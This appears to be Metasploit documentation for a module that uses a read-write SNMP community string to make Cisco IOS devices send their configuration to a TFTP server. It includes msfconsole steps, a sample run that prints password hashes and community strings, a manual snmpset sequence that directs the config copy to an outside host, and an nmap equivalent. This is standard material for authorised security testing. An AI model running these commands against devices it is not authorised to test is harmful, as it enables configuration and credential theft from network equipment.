## Vulnerable Application

  Cisco IOS devices can be configured to back-up their running and startup configurations via SNMP.
  This is a well [documented](https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/15217-copy-configs-snmp.html#copying_startup)
  feature of IOS and many other networking devices, and is part of an administrator functionality.
  A read-write community string is required, as well as a tftp server (metasploit includes one).
  After the config has been copied, the SNMP paramters are deleted.

## Verification Steps

  1. Enable SNMP with a read/write community string on IOS: `snmp-server community private rw`
  2. Start msfconsole
  3. Do: ```use auxiliary/scanner/snmp/cisco_config_tftp```
  4. Do: ```set COMMUNITY [read-write snmp]```
  5. Do: ```set rhosts [ip]```
  6. Do: ```run```

## Options

  **COMMUNITY**

  The SNMP community string to use which must be read-write.  Default is `public`.

## Scenarios

### Cisco UC520-8U-4FXO-K9 running IOS 12.4

```
msf5 > setg rhosts 2.2.2.2
rhosts => 2.2.2.2
msf5 > use auxiliary/scanner/snmp/cisco_config_tftp
msf5 auxiliary(scanner/snmp/cisco_config_tftp) > set community private
community => private
msf5 auxiliary(scanner/snmp/cisco_config_tftp) > run

[*] Starting TFTP server...
[*] Scanning for vulnerable targets...
[*] Trying to acquire configuration from 2.2.2.2...
[*] Scanned 1 of 1 hosts (100% complete)
[*] Providing some time for transfers to complete...
[*] Incoming file from 2.2.2.2 - 2.2.2.2.txt 22831 bytes
[+] 2.2.2.2:161 MD5 Encrypted Enable Password: $1$TF.y$3E7pZ2szVvQw5JG8SDjNa1
[+] 2.2.2.2:161 Username 'cisco' with MD5 Encrypted Password: $1$DaqN$iP32E5WcOOui/H66R63QB0
[+] 2.2.2.2:161 SNMP Community (RO): public
[+] 2.2.2.2:161 SNMP Community (RW): private
[*] Shutting down the TFTP service...
[*] Auxiliary module execution completed
```

### Manual Interaction
This process can also be executed manually utilizing Metasploit's TFTP server.
Cisco's [documentation](https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/15217-copy-configs-snmp.html#copying_startup)
was utilized to create this process.

1. Start the TFTP server

```
msf5 > use auxiliary/server/tftp 
msf5 auxiliary(server/tftp) > run
[*] Auxiliary module running as background job 0.
msf5 auxiliary(server/tftp) > 
[*] Starting TFTP server on 0.0.0.0:69...
[*] Files will be served from /tmp
[*] Uploaded files will be saved in /tmp
```

2. Execute the SNMP commands.  An integer is required to group the requests together, `666` is used in this example.

```
msf5 auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.2.666 i 1 
[*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.2.666 i 1 

iso.3.6.1.4.1.9.9.96.1.1.1.1.2.666 = INTEGER: 1
msf5 auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.3.666 i 4 
[*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.3.666 i 4 

iso.3.6.1.4.1.9.9.96.1.1.1.1.3.666 = INTEGER: 4
msf5 auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.4.666 i 1 
[*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.4.666 i 1 

iso.3.6.1.4.1.9.9.96.1.1.1.1.4.666 = INTEGER: 1
msf5 auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.5.666 a "1.1.1.1" 
[*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.5.666 a "1.1.1.1" 

iso.3.6.1.4.1.9.9.96.1.1.1.1.5.666 = IpAddress: 1.1.1.1
msf5 auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.6.666 s "backup_config" 
[*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.6.666 s "backup_config" 

iso.3.6.1.4.1.9.9.96.1.1.1.1.6.666 = STRING: "backup_config"
msf5 auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.666 i 1 
[*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.666 i 1 

iso.3.6.1.4.1.9.9.96.1.1.1.1.14.666 = INTEGER: 1
```

3. At this point the config is transferring, we need to wait a few seconds.  Lastly, we'll remove `666` from the system.

```
msf5 auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.666 i 6
[*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.666 i 6

iso.3.6.1.4.1.9.9.96.1.1.1.1.14.666 = INTEGER: 6
```

4. Confirm we have our config file

```
msf5 auxiliary(server/tftp) > ls -lah /tmp/backup_config
[*] exec: ls -lah /tmp/backup_config

-rw-r--r-- 1 root root 23K Oct 11 22:20 /tmp/backup_config
```

## Confirming using NMAP

Utilizing the [snmp-ios-config](https://nmap.org/nsedoc/scripts/snmp-ios-config.html) script

```
nmap -sU -p 161 --script snmp-ios-config --script-args creds.snmp=:private 192.168.2.239
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-11 22:30 EDT
Nmap scan report for 192.168.2.239
Host is up (0.0034s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-ios-config: 
| !
| ! Last configuration change at 18:01:46 PST Fri Jan 7 2000 by cisco
| ! NVRAM config last updated at 06:07:55 PST Tue Jan 4 2000 by cisco
| !
| version 12.4
| parser config cache interface
| no service pad
| service timestamps debug datetime msec
| service timestamps log datetime msec
| no service password-encryption
| service internal
| service compress-config
| service sequence-numbers
| !
| hostname UC520
...sip...
```
